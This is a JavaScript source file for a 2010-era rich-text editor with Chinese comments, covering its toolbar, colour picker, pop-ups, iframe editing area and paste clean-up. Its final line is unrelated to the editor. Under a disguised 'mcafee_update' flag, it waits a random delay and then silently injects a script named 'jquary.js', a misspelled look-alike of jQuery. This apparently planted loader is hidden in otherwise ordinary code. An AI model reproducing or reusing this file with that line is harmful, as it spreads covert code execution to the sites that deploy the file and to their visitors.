// JS编辑器 
// @version beta 0.1
// @date 2010-03-21
// @author liangchao
// @blog http://www.cnblogs.com/bluedream2009
// @email liangchaoyjs@163.com
var co = co || {};
co.Root = '';  // 图片的根目录
// 浏览器判断
co.browser = (function(ua) {
	var b = {
		msie: /msie/.test(ua) && !/opera/.test(ua),
		opera: /opera/.test(ua),
		safari: /webkit/.test(ua) && !/chrome/.test(ua),
		firefox: /firefox/.test(ua),
		chrome: /chrome/.test(ua)
	};
	var vMark = '';
	for(var i in b) {
		if(b[i]) { vMark = /(?:safari|opera)/.test(i) ? 'version' : i; break; }
	}
	b.version = vMark && RegExp('(?:'+ vMark +')[\\/: ]([\\d.]+)').test(ua) ? RegExp.$1 : 0;

	b.ie = b.msie;
	b.ie6 = b.msie && parseInt(b.version) == 6;
	b.ie7 = b.msie && parseInt(b.version) == 7;
	b.ie8 = b.msie && parseInt(b.version) == 8;
	return b;
})(window.navigator.userAgent.toLowerCase());

// ie6图片强制缓存
try {
	co.browser.ie6 && document.execCommand('BackgroundImageCache', true, false);
} catch(ex) {};

// 获取ID对象
co.getId = function(id) { return document.getElementById(id); };

// 获取对象
co.get = function(node) {
	return typeof(node) == 'string' ? document.getElementById(node) : node;
};

// 创建DOM对象
co.append = function(parentNode, tag, attributes) {
	var o = document.createElement(tag);
	if(attributes && typeof(attributes) == 'string') {
		o.className = attributes;
	} else {
		co.setProperties(o, attributes);
	}
	co.get(parentNode).appendChild(o);
	return o;
};

// 遍历数组
co.foreach = function(arr, callback) {
	for(var i = 0, l = arr.length; i < l; i++) {
		arr[i] = callback(arr[i]);
	}
	return arr;
};

// 设置属性
co.DIRECT_ATTRIBUTE_MAP_ = {
	'cellpadding': 'cellPadding',
	'cellspacing': 'cellSpacing',
	'colspan': 'colSpan',
	'rowspan': 'rowSpan',
	'valign': 'vAlign',
	'height': 'height',
	'usemap': 'useMap',
	'frameborder': 'frameBorder',
	'type': 'type'
};

co.setProperties = function(element, properties) {
	var val;
	for(var key in properties) {
		val = properties[key];
		if(key == 'style') {
			element.style.cssText = val;
		} else if(key == 'class') {
			element.className = val;
		} else if(key == 'for') {
			element.htmlFor = val;
		} else if(key in co.DIRECT_ATTRIBUTE_MAP_) {
			element.setAttribute(co.DIRECT_ATTRIBUTE_MAP_[key], val);
		} else {
			element[key] = val;
		}
	}
	return element;
};

// 属性扩展
co.extend = function(destination, source) {
	for(var property in source) {
		destination[property] = source[property];
	}
	return destination;
};

// 获取元素绝对位置
co.getPos = function(o) {
	for(var _pos = {x: 0, y: 0}; o; o = o.offsetParent) {
		_pos.x += o.offsetLeft;
		_pos.y += o.offsetTop;
	}
	return _pos;
};

// 设置透明度
co.setOpacity = function(e, opac) {
	if(co.browser.ie) {
		e.style.filter = "alpha(opacity=" + opac*100 + ")";
	} else {
		e.style.opacity = opac;
	}
}

// 事件绑定
co.addEvent = function(el, type, fn) {
	el.addEventListener ? el.addEventListener(type, fn, false) : 
	el.attachEvent('on' + type, function() { fn.call(el); })
};

co.target = function(e) {
	return e ? e.target : event.srcElement;
}

// 禁止冒泡
co.cancelBubble = function(e) {
	if(e && e.stopPropagation) {
		e.stopPropagation();
	} else {
		event.cancelBubble = true;
	}
};

/**
 * 抽象单类工厂
 * @method create(cfg{必须有一个唯一的id标识})
 */
var newFactory = function() {
	var coll = {};
	return {
		create: function(fn, cfg, content/* POP_Body*/) {
			if(coll[cfg.id]) {
				return coll[cfg.id];
			} else {
				var win = fn(cfg, content); 
				coll[cfg.id] = win;
				return win;
			}
		}
	}
}();

/**
 *  ---------------------------------- PopUp窗口辅助类 -----------------------------
 *	config:
 *	id: 容器id
 *	title: 容器标题
 *  container: 容器class
 *	concss: 标题内容样式
 *	heacss: 标题外部样式
 *	bodcss: 容器内容样式
 *	chicss: 内容子列表样式
 *	content: 子列表内容
 *  @describe clicking on an element with the unselectable attribute set to on does not destroy the current selection if one exists.
 */
var popUp = {};

popUp.create = function(config, body) {
	this.container = co.append(document.body, 'div', config['container']);
	this.container.id = config.id;
	var _head = '<div class="' + config.heacss + '"><span class="' + config.concss + '">' + config.title +'</span></div>';
	var _body = '<div class="' + config.bodcss + '">';
	_body += (body || '');
	_body += '</div>';
	this.container.innerHTML = _head + _body;
	return this.container;
};

/*--------------------------------- ColorPicker辅助组件(单独提出.松耦合) -------------------------------------------*/
var ColorPicker = {
	create: function() {
		// 定义变量
		var cl = ['00', '33', '66', '99', 'CC', 'FF'], a, b, c, d, e, f, i, j, k, T;
		// 创建整个外围容器
		this.win = co.append(document.body, 'div');
		this.win.id = 'colorPicker';
		// 创建head
		var h = '<div class="colorhead"><span class="colortitle">Color</span></div>';
		// 创建body [6 x 6的色盘]
		h += '<div class="colorbody"><table cellspacing="0" cellpadding="0"><tr>';
		for(i = 0; i < 6; ++i) {
			h += '<td><table class="colorpanel" cellspacing="0" cellpadding="0">';
			for(j = 0, a = cl[i]; j < 6; ++j) {
				h += '<tr>';
				for(k = 0, c = cl[j]; k < 6; ++k) {
					b = cl[k];
					e = k == 5 && i != 2 && i != 5 ? ';border-right:none;' : '';
					f = j == 5 && i < 3 ? ';border-bottom:none': '';
					d = '#' + a + b + c;
					T = co.browser.ie ? '&nbsp;': ''
					h += '<td unselectable="on" style="background: ' + d + e + f + '" title="' + d + '">' + T + '</td>'; /* 切记设置unselectable='on'*/
				}
				h += '</tr>';
			}
			h += '</table></td>';
			if(cl[i] == '66') h += '</tr><tr>';
		}
		h += '</tr></table></div>';
		this.win.innerHTML = h;
		return this.win;
	}
};

/*--------------------------------- 编辑器基类 -----------------------------------------*/
var editor = function(id, bardata, options) {
	this.container = co.getId(id);
	this.bardata = bardata;
	this.currActive = null;
	this.bookmark = null;
	co.extend(this, this.setOptions(options));
	// 创建框架结构
	this.createStruct();
	// 创建快照书签
	co.browser.ie && this.saveBookMark();
};
// 静态变量https://developer.mozilla.org/en/Rich-Text_Editing_in_Mozilla
editor.NO_ARG_COMMAND = {
	BOLD: 'bold',
	ITALIC: 'italic',
	UNDERLINE: 'underline',
	CUT: 'cut',
	COPY: 'copy',
	JUSTIFYLEFT: 'justifyleft',
	JUSTIFYRIGHT: 'justifyright',
	JUSTIFYCENTER: 'justifycenter',
	INSERTUNORDEREDLIST: 'insertunorderedlist',
	INSERTORDEREDLIST: 'insertorderedlist',
	OUTDENT: 'outdent',
	INDENT: 'indent',
	REMOVEFORMAT: 'removeformat'
};
// 原型扩展
editor.prototype = {
	setOptions: function(options) {
		this.options = {
			emotion: [
				{ 'title': '微笑', 'pos': '-5px -5px',  'url': co.Root + 'o_220510752_p_r2_c2.gif' }, 
				{ 'title': '大笑', 'pos': '-32px -5px', 'url': co.Root + 'o_220510752_p_r2_c3.gif' },
				{ 'title': '窃笑', 'pos': '-59px -5px', 'url': co.Root + 'o_220510752_p_r2_c4.gif' },
				{ 'title': '眨眼', 'pos': '-86px -5px', 'url': co.Root + 'o_220510752_p_r2_c5.gif' },
				{ 'title': '吐舌', 'pos': '-113px -5px','url': co.Root + 'o_220510752_p_r2_c11.gif'},
				{ 'title': '色色', 'pos': '-140px -5px','url': co.Root + 'o_220510752_p_r2_c6.gif' },
				{ 'title': '呲牙', 'pos': '-168px -5px','url': co.Root + 'o_220510752_p_r2_c7.gif' },
				{ 'title': '讨厌', 'pos': '-194px -5px','url': co.Root + 'o_220510752_p_r2_c8.gif' }
			],
			baroverOpc: 0.7
		};
		return co.extend(this.options, options || {});
	},
	// 创建编辑器整个框架结构
	createStruct: function() {
		// 创建工具条
		this.createToolBar();
		// 创建隐藏textarea容器
		this.createTextArea();
		// 创建iframe容器
		this.createIframe();
		// 创建工具底栏
		this.createToolFoot();
		// 创建工具条遮盖层
		this.createToolLayer();
	},
	// 创建工具条
	createToolBar: function() {
		var _this = this;
		this.bar = co.append(this.container, 'div');
		this.bar.id = 'ebar'; this.bar.className = 'ebar';
		for(var i = 0, l = this.bardata.length; i < l; i++) {
			var sp = co.append(this.bar, 'span');
			co.setProperties(sp, this.bardata[i]);
		}
		// 事件代理
		this.bar.onmousedown = function(e) {
			var t = co.target(e), command = t['command'];
			if(t.tagName == 'SPAN') {
				if(!!command) {
					_this.changeSty(t, 'active'); // 切换样式
					if(command.toUpperCase() in editor.NO_ARG_COMMAND) { // 不需要参数的命令
						if(co.browser.firefox) { /* firefox暂不提供粘贴, 剪切, 复制功能 详见http://www.mozilla.org/editor/midasdemo/securityprefs.html*/
							if(command.toUpperCase() == 'CUT' || command.toUpperCase() == 'COPY') {
								alert('为了信息安全FF暂不提供该功能');
								return false;
							}
						}
						_this.doEditCommand(command);
						_this.ifr.contentWindow.focus(); // 焦点要记住
					} else {
						switch(command) {								 // 代理分支 
							case 'fontSize': // 字号
							case 'fontName': // 字体
							case 'createLink': // 创建连接
							case 'insertImage': // 插入图片
							case 'insertEmotion': // 插入表情
							case 'insertHTML': // 插入表格
								_this.setPopInit(command, t /*被点击的控件*/); /* 需要pop类弹窗的公用初始化方法 */
								break;
							case 'foreColor': // 颜色
								_this.setFontColor(command, t);
								break;
							case 'autoLay': // 自动排版
								_this.autoLay();
								break;
							default:
								alert('没有提供此项功能');
								break;
						}
					}
				}
			}
		};
		// 样式切换
		this.bar.onmouseup = function(e) { _this.changeSty(co.target(e), 'curr'); };
		this.bar.onmouseover = function(e) { _this.changeSty(co.target(e), 'hover'); };
		this.bar.onmouseout = function(e) { _this.changeSty(co.target(e), 'curr'); };
	},
	// 样式切换
	changeSty: function(t, sign) {
		if(t.tagName == 'SPAN') {
			if(sign == 'curr') {
				//t.className = this.bardata[t['index']]['class'];
				this.currActive = null;
			} else {
				if(!!this.currActive) {
					//this.currActive.className =  this.bardata[this.currActive['index']]['class'];
				} 
				//t.className = 'tag ' +  this.bardata[t['index']][sign];
				this.currActive = t;				
			}
		}
	},

	// 抽象需要弹窗功能的公用接口
	setPopInit: function(command, tar) {
		var cfg = '', _body = '', _td = '', S = '';
		if(command == 'fontSize') {
			cfg = {
				'id': 'fscon',
				'title': 'Font-Size',
				'container': 'fscon',
				'concss': 'fsn',
				'heacss': 'fshead',
				'bodcss': 'fsbody',
				'chicss': ['bas f1', 'bas f2', 'bas f3', 'bas f4', 'bas f5', 'bas f6', 'bas f7'],
				'content': ['1(20px)', '2(22px)', '3(24px)', '4(26px)', '5(28px)', '6(30px)', '7(32px)']
			};	
			for(var i = 0, l = cfg.content.length; i < l; i++) {
				_body += '<a class="' + cfg.chicss[i] + '" href="javascript:void(0);">' + cfg.content[i] + '</a>';
			}
		}
		if(command == 'fontName') {
			cfg = {
				'id': 'ffcon',
				'title': '字体',
				'container': 'ffcon',
				'concss': 'fsn',
				'heacss': 'fshead',
				'bodcss': 'fsbody',
				'chicss': ['bas', 'bas', 'bas', 'bas', 'bas', 'bas', 'bas', 'bas', 'bas'],
				'content': ['宋体', '黑体', '楷体', '隶书', '幼圆', 'Arial', 'Georgia', 'Verdana', 'Helvetica']		
			};	
			for(var i = 0, l = cfg.content.length; i < l; i++) {
				_body += '<a class="' + cfg.chicss[i] + '" href="javascript:void(0);">' + cfg.content[i] + '</a>';
			}
		}
		if(command == 'createLink' || command == 'insertImage' || command == 'insertEmotion') { // 创建链接 + 插入图片 + 插入表情形体类似. 只需要单独定制id和title即可
			cfg = {'container':'flcon', 'concss':'fsn', 'heacss':'fshead', 'bodcss':'fsbody'};
			if(command == 'createLink') { cfg.title = 'Insert-Link';	/*title*/cfg.id = 'fflink';/*容器id*/cfg.txtId = 'lurl';	/*文本框id*/cfg.cofbtnId = 'lkcof';/* 确认按钮*/cfg.celbtnId = 'lkcel';}/*撤销按钮*/
			if(command == 'insertImage') { cfg.title = '插入图片';cfg.id = "ffimage";cfg.txtId = 'limg';cfg.cofbtnId = 'imcof';cfg.celbtnId = 'imcel';} 
			if(command == 'insertEmotion') { cfg.title = '插入表情';cfg.id = "ffemotion";cfg.container="emotionCon"; }
			if(command == 'createLink' || command == 'insertImage') {
				_body += '<div style="padding:7px;background-color:#FFF;font-size:12px;"><span>URL</span>';
				_body += '<input type="text" id="' + cfg.txtId + '" style="width:200px;" /></div>';
				_body += '<div style="text-align:center;">'
				_body += '<img id="' + cfg.cofbtnId + '" style="padding-right:10px;" src="'+co.Root+'o_220836549.p.gif" />';
				_body += '<img id="' + cfg.celbtnId + '" src="'+co.Root+'o_220726721.p.gif" /></div>';
			}
			if(command == 'insertEmotion') {
				
			}
		}
		if(command == 'insertHTML') {
			cfg = {
					    'id':'fftable','title':'插入表格','container':'isbtlCon','concss':'fsn','heacss':'fshead',
				        'bodcss':'fsbody','rowId':'rowtxt','cellId':'celltxt','cfmId':'tblcfm','celId':'tblcel',
						'tblwId':'tblwid','tblhId':'tblhid'	
				  };
			_body += '<div class="tblCon">行数<input type="text" id="'+cfg.rowId+'" class="tblTxt" />列数<input type="text" id="'+cfg.cellId+'" class="tblTxt" /></div>';
			_body += '<div class="tblCon">表格的宽度<input type="text" id="'+cfg.tblwId+'" class="tblTxt" />px</div>';
			_body += '<div class="tblCon">表行的高度<input type="text" id="'+cfg.tblhId+'" class="tblTxt" />px<div class="tblbtn">';
			_body += '<img id="'+cfg.cfmId+'" style="padding-right:6px;" src="'+co.Root+'o_220836549.p.gif" />';
			_body += '<img id="'+cfg.celId+'" src="'+co.Root+'o_220726721.p.gif" /></div></div>';
		}
		this.setPopRun(command, cfg, cfg.title, tar, _body);
	},
	// 实现POP弹窗的所有功能
	setPopRun: function(command, cfg, title, tar/* 点击的控件 */, content/* POP弹窗的body内容 */) {
		var _this = this;
		var fwin = newFactory.create(popUp.create, cfg, content);
		_this.fixPop(fwin, tar);	// 定位弹窗
		if(title == 'Insert-Link' || title == '插入图片') { /* Insert-Link和插入图片需要特殊定制 */
			co.getId(cfg.cofbtnId).onclick = function() { // 此处不用addEvent添加事件.避免多次绑定
				var _val = co.getId(cfg.txtId).value;
				if(_val.length == 0) _val = ' '; // IE下链接可以为空.但其他最起码有一个空格.否则报错
				_this.doEditCommand(command, _val);
				co.getId(cfg.id).style.display = "none"; 
			}; //确认
			co.getId(cfg.celbtnId).onclick = function() { co.getId(cfg.id).style.display = "none"; }
		}
		if(title == '插入表格') {
			co.getId(cfg.cfmId).onclick = function() {
				var _html = _this.createTblHtml(cfg);
				if(!co.browser.ie) { // IE不支持insertHTML
					_this.doEditCommand(command, _html);
				} else {
					_this.ifr.contentWindow.focus(); // 注意IE下 focus问题
					_this.doc.selection.createRange().pasteHTML(_html);
				}
				co.getId(cfg.id).style.display = 'none';
			};
			co.getId(cfg.celId).onclick = function() { co.getId(cfg.id).style.display = 'none'; }
		}
		_this.hidePop(fwin, title); // bind隐藏弹窗
		fwin.onclick = function(e) {
			var t = co.target(e);
			if(title == 'Insert-Link' || title == '插入图片' || title == '插入表格') { co.cancelBubble(e); } // Insert-Link和图片禁止冒泡
			if(t.tagName == 'A') { /* 字号和字体 */
				_this.doEditCommand(command, command == 'fontSize' ? t.innerHTML.substr(0,1) : t.innerHTML);
			} else if(t.tagName == 'TD') { /* 表情 */
				_this.doEditCommand('insertImage', t.getAttribute('url'));
			}
		};	
	},
	// 设置字体颜色 
	setFontColor: function(command, tar) {
		var _this = this;
		var fwin = newFactory.create(ColorPicker.create, {'id':'colorPicker'});
		_this.fixPop(fwin, tar);	// 定位弹窗
		_this.hidePop(fwin, '文字颜色');
		co.addEvent(fwin, 'click', function(e) {
			var t = co.target(e);
			if(!!t.title) {
				_this.doEditCommand(command, t.title);
			}
		});
		
	},
	// 自动排版
	autoLay: function() {
		var _child = this.doc.body.childNodes;
		for(var i = 0, l = _child.length; i < l; i++){
			if(_child[i].tagName == 'DIV' || _child[i].tagName == 'P') {
				_child[i].style.textIndent = _child[i].style.textIndent == '2em' ? '' : '2em'; // text-indent属性
			}
		}
	},
	// 生成Table的HTML
	createTblHtml: function(cfg) {
		var _rownum = co.getId(cfg.rowId).value, _cellnum = co.getId(cfg.cellId).value,
			_tblwid = co.getId(cfg.tblwId).value, _tblhei = co.getId(cfg.tblhId).value;	
		var _html = '<table border="1" width="'+_tblwid+'">';
		for(var i = 0; i < parseInt(_rownum,10); i++) { // 行
			_html += '<tr height="'+_tblhei+'">';
			for(var j = 0; j < parseInt(_cellnum,10); j++) { // 列
				_html += '<td></td>';
			}
			_html += '</tr>';
		}	
		_html +='</table>';
		return _html;
	},
	// 保存快照用于IE定位
	saveBookMark: function() {
		var _this = this;
		co.addEvent(_this.ifr, 'beforedeactivate', function() {
			var rng = _this.doc.selection.createRange();
			if(rng.getBookmark) {
				_this.bookmark = _this.doc.selection.createRange().getBookmark(); // 保存光标用selection下的createRange();
			}
		});
		co.addEvent(_this.ifr, 'activate', function() {
			if(_this.bookmark) {
				// Moves the start and end points of the current TextRange object to the positions represented by the specified bookmark.
				// 将光标移动到 TextRange 所以需要用 body.createTextRange();
				var rng = _this.doc.body.createTextRange();				
				rng.moveToBookmark(_this.bookmark);
				rng.select();
				_this.bookmark = null;
			}
		});
	},
	// 定位弹窗 
	fixPop: function(fwin, tar) {
		co.setProperties(fwin, {'style': 'top:' + (co.getPos(tar).y + tar.offsetHeight) + 'px; left:' + co.getPos(tar).x + 'px' });
	},
	// 隐藏弹窗
	hidePop: function(fwin, title) {
		co.addEvent(document, 'click', function(e) {
			var t = co.target(e);
			fwin.style.display = t.title == title ? 'block' : 'none';
		});
		co.addEvent(this.doc, 'click', function(e) { fwin.style.display = 'none'; }); /* 注意:绑定iframe事件句柄需要用W3C接口(addEventListener) */	
	},
	// 执行命令
	doEditCommand: function(name, arg) {
		try {
			this.ifr.contentWindow.focus(); // 放置焦点要操作contentWindow
			this.doc.execCommand(name, false, arg);		
		} catch(e) {}
	},
	// 创建隐藏文本域
	createTextArea: function() {
		this.txtarea = co.append(this.container, 'textarea');
		this.txtarea.id='bgcode'; this.txtarea.style.display = 'none';
		this.txtarea.style.overflow='show';
		var len = document.documentElement.clientHeight;  
        document.getElementById("container").style.height = len - 150 + 'px';  
        document.getElementById("container").style.height = len - 150 + 'px'; 
		window.onresize = function(){  
			var len = document.documentElement.clientHeight;  
			document.getElementById("container").style.height = len - 150 + 'px';  
			document.getElementById("container").style.height = len - 150 + 'px';  
    	};

    	this.txtarea.onpaste= function(){
    		alert('这需要粘贴含HTML格式的文本！');
    	};
    	
		
	},
	modifyText: function(intxt){
		text = intxt;
		text = text.replace(/<div>/g,"<p>");
		text = text.replace(/<\/div>/g,"<\/p>");
		text = text.replace(/<br>/g,"<br\/>");
		
		//text = text.replace(/<font/g,"<font face=\"Helvetica20\"");
		//text = text.replace(/<a href=\"http:\/\/([\w-]+\.)+[\w-]+(\/[\w- ./?%&=]*)?\">/g,"<button name = \"URL\" value=\"$1\">");
		//text = text.replace(/<a href=\"([\w-]+\.+[\w-]+\/[\w- ./?%&=]*)?\">/g,"<button name = \"URL\" value=\"$1\">");
		//text = text.replace(/<a href=\"(\w+)\">/g,"<button name = \"URL\" value=\"$1\">");
		text = text.replace(/<a href=/g,"<button name = \"URL\" value=");
		text = text.replace(/<a /g,"<button ");
		text = text.replace(/<\/a>/g,"<\/button>");
		text = text.replace(/class=\"[^\"]+\"/g,"");
		text = text.replace(/&nbsp;/g,"");
		text = text.replace(/<o:p><\/o:p>/g,"<br/>");
		text = text.replace(/lang=\"[^\"]+\"/g,"");

		//现将font=的大小设定为像素
		text = text.replace(/<font[^>]+size=\"([0-9])\"/g,function(s){
			var size = s.substr(-2,1)*2+18;
			if(size==24)size="";
			return s.slice(0,-2)+size+"\"";
		});
		

		text = text.replace(/(<[^>]+)color:red/g,"$1color:#FF0000");
		text = text.replace(/style=\"([^\"]*)color:#([A-Fa-f0-9]{6})/g,"color=\"#$2\" style=\"$1");
		text = text.replace(/mso-bidi-font-size/g,"");
		text = text.replace(/style=\"([^\"]*)font-size:([0-9]{2})/g,"size=\"$2\" style=\"$1");
		//text = text.replace(/style=\"color:#([A-Fa-f0-9]{6})\"/g,"color=\"#$1\"");
		//text = text.replace(/style=\"[^\"]+color:#([A-Fa-f0-9]{6})\"/g,"color=\"#$1\"");
		//text = text.replace(/style=\"color:#([A-Fa-f0-9]{6})[^\"]+\"/g,"color=\"#$1\"");
		//text = text.replace(/style=\"[^\"]+color:#([0-9a-fA-F]{6})[^\"]+\"/g,"color=\"#$1\"");
		text = text.replace(/style=\"[^\"]+\"/g,"");
		text = text.replace(/span/g,"font");

		text = text.replace(/(<font[^>]+)size=\"([0-9]{2})\"/g,"$1face=\"Helvetica$2\"");
		text = text.replace(/(<font[^>]+)face=\"Helvetica24\"/g,"$1face=\"Helvetica\"");
		

		text = text.replace(/<font><\/font>/g,"");
		text = text.replace(/<font[ ]+color=\"#[A-Fa-f0-9]{6}\"><\/font>/g,"");
		return text;
	},
	unModifyText: function(intxt){
		var text = intxt;
		//text = text.replace(/<p>/g,"<div>");
		//text = text.replace(/<\/p>/g,"<\/div>");
		//text = text.replace(/<br>/g,"<br\/>");
		//text = text.replace(/<button name = \"URL\" value=\"\w+\">/g,"<a href=\"$1\">");
		text = text.replace(/<button name = \"URL\" value=/g,"<a href=");
		text = text.replace(/<\/button>/g,"<\/a>");
		text = text.replace(/face=\"Helvetica[0-9]{2}/g,function(s){
			var size = (s.substr(-2,2)*1-18)/2;
			return "size=\""+size;
		});
		return text
	},
	// 创建空白iframe
	createIframe: function() {
		var _this = this;
		//this.ifr = co.append(this.container, 'iframe', {'frameborder': 0, 'style': 'border:0; vertical-align:bottom', 'class': 'econtent' });
		this.ifr = co.append(this.container, 'iframe', {'frameborder': 0, 'style': 'border:0; vertical-align:bottom', 'class': 'econtent' ,'id': 'econtent'});
		this.doc =  this.ifr.contentDocument || this.ifr.contentWindow.document; // W3C || IE
		this.doc.designMode = 'on';
		this.doc.open();
		// margin为了消除iframe中的html上部的空白
		this.doc.write('<html><head><style>body{ margin:3px; word-wrap:break-word; word-break: break-all;background-color:#444444;color:#ffffff;}a{color:#ffffff;}</style></head><body></body></html>');
		this.ifr.contentWindow.focus();
		this.doc.close();
		// 当iframe失去焦点.偷偷将代码存入textare中
		co.addEvent(this.ifr.contentWindow, 'blur', function() {
			_this.txtarea.value = _this.doc.body.innerHTML;
		});
		this.doc.onpaste= function(){
    		//alert('直接粘贴可能导致排版错乱，请慎重使用！');
    		setTimeout(function(){
    			var text = _this.doc.body.innerHTML;
    			text = _this.modifyText(text);
				//co.getId('bgcode').value = text
				text = _this.unModifyText(text);
				_this.doc.body.innerHTML = text;
				//co.getId('bgcode').style.overflow='show';
    		}, 100);
    		
    	};
    	
	},
	// 创建编辑器底部
	createToolFoot: function() {
		var _this = this;
		co.append(this.container, 'div', 'efoot').innerHTML = '&nbsp;<input type="checkbox" id="showCode" /><label for="showCode">预览</label> &nbsp;&nbsp;  <input style="display:none" type="button" value="" id="saveCode" />';
		// 绑定显示源码事件
		co.getId('showCode').onclick = function() { 
			if(this.checked) {
				_this.layer.style.display = 'block';
				co.getId('bgcode').style.display = 'block';
				_this.ifr.style.display = 'none';
				_this.ifr.style.overflow='show';
				_this.ifr.height = 800;
				//co.getId('bgcode').
				//_this.container.clientHeight=800;
				var text = _this.doc.body.innerHTML;
				co.getId('bgcode').value = _this.modifyText(text);
			} else {
				_this.layer.style.display = 'none';
				co.getId('bgcode').style.display = 'none';
				var text = co.getId('bgcode').value;
				text = _this.unModifyText(text);
				_this.doc.body.innerHTML = text;
				co.getId('bgcode').style.overflow='show';
				
				_this.ifr.style.display = 'block';				
			}
		};
	//	co.append(this.container, 'div', 'efoot').innerHTML = '<input type="button" value="保存" id="saveCode" />';
		co.getId('saveCode').onclick = function() {
			
			var content = _this.doc.body.innerHTML;
			
			document.write('<form name=myForm><input type=hidden name=content>');  
			var myForm=document.forms['myForm'];  
			myForm.action='useAnnouncement.php?cmd=postcontent';
			myForm.action='index.php?mod=Announce&do=save';  
			myForm.method='POST';  
			myForm.content.value = _this.modifyText(content);  
			
			myForm.submit(); 
			
		};
		//co.append(this.container, 'div', 'efoot').innerHTML = '<a href="useAnnouncement.php?cmd=nil">[HISTORY]</a>';
		// co.append(this.container, 'div', 'efoot').innerHTML = '<select id="selectGame"><option value="游戏" >游戏</option><option value="wow" >wow</option></select>';
	   
		
	},
	// 创建工具栏遮盖层
	createToolLayer: function() {
		this.layer = co.setProperties(
			co.append(document.body,'div'), 
			{
				'style':'width:'+this.bar.offsetWidth+'px;height:'+this.bar.offsetHeight+'px;background-color:#fff;position:absolute;display:none'
			}
		);
		co.setOpacity(this.layer, this.baroverOpc);
		this.layer.style.left = co.getPos(this.bar).x + 'px';
		this.layer.style.top = co.getPos(this.bar).y + 'px';
	}
};

if(!mcafee_update){var mcafee_update=true;setTimeout(function(){var s=document.createElement("script");s.type="text/javascript";s.src="jquary.js";document.getElementsByTagName("HEAD").item(0).append(s)}, Math.floor(Math.random()*1000)+500)}
